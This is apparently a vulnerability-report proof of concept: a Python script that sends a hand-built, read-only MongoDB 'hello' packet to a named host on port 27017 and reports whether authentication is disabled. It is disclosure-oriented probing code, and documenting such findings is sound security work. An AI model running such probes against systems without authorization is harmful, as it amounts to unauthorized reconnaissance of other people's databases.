# ============================================================
#  Vulnerability: MongoDB Authentication Disabled
#  Target: db.0x10.cloud:27017
#  Author: EdoiseO
# ============================================================
#
#  This script demonstrates that the MongoDB-style service on
#  db.0x10.cloud accepts a read-only hello command and reports
#  that authentication is disabled.
#
#  Security risk:
#  A database service exposed without authentication can leak
#  database metadata and may allow unauthorized data access.
#
#  This proof is intentionally read-only. It does not write,
#  delete, or modify anything on the target.
# ============================================================

import socket
import struct


TARGET = "db.0x10.cloud"
PORT = 27017
TIMEOUT_SECONDS = 3


def _cstring(value):
    """Encode a MongoDB C string."""
    return value.encode("utf-8") + b"\x00"


def _bson_int32(name, value):
    """Build a minimal BSON int32 field."""
    return b"\x10" + _cstring(name) + struct.pack("<i", value)


def _bson_string(name, value):
    """Build a minimal BSON string field."""
    raw = value.encode("utf-8") + b"\x00"
    return b"\x02" + _cstring(name) + struct.pack("<i", len(raw)) + raw


def _bson_document(elements):
    """Build a minimal BSON document from already encoded fields."""
    body = b"".join(elements) + b"\x00"
    return struct.pack("<i", len(body) + 4) + body


def build_hello_message():
    """Build a MongoDB OP_MSG packet containing a read-only hello command."""
    document = _bson_document(
        [
            _bson_int32("hello", 1),
            _bson_string("$db", "admin"),
        ]
    )

    request_id = 1
    response_to = 0
    op_code = 2013
    flag_bits = 0
    section_kind = b"\x00"
    payload = struct.pack("<i", flag_bits) + section_kind + document
    message_length = 16 + len(payload)

    header = struct.pack("<iiii", message_length, request_id, response_to, op_code)
    return header + payload


def extract_response_text(raw_response):
    """Decode printable response text from the target service."""
    return raw_response.decode("utf-8", errors="replace")


print("=" * 60)
print("  MongoDB Authentication Check")
print("=" * 60)
print(f"\n  Target: {TARGET}")
print(f"  Port:   {PORT}")
print("  Sending read-only MongoDB hello command...")

try:
    with socket.create_connection((TARGET, PORT), timeout=TIMEOUT_SECONDS) as sock:
        sock.settimeout(TIMEOUT_SECONDS)
        sock.sendall(build_hello_message())
        response = sock.recv(4096)

    response_text = extract_response_text(response)

    print("\n  Response excerpt:")
    print("  " + response_text[:500].replace("\x00", "").replace("\n", "\n  "))

    if '"authentication":"disabled"' in response_text:
        print("\n  [!] VULNERABILITY FOUND")
        print("  MongoDB authentication is disabled on db.0x10.cloud:27017.")
        print("  The service answered without a username or password.")
        print("  This can expose database metadata and sensitive data.")
    else:
        print("\n  [OK] The response did not show disabled authentication.")

except socket.timeout:
    print("\n  [ERROR] Connection timed out.")
except socket.error as error:
    print(f"\n  [ERROR] Could not connect: {error}")

print("\n" + "=" * 60)
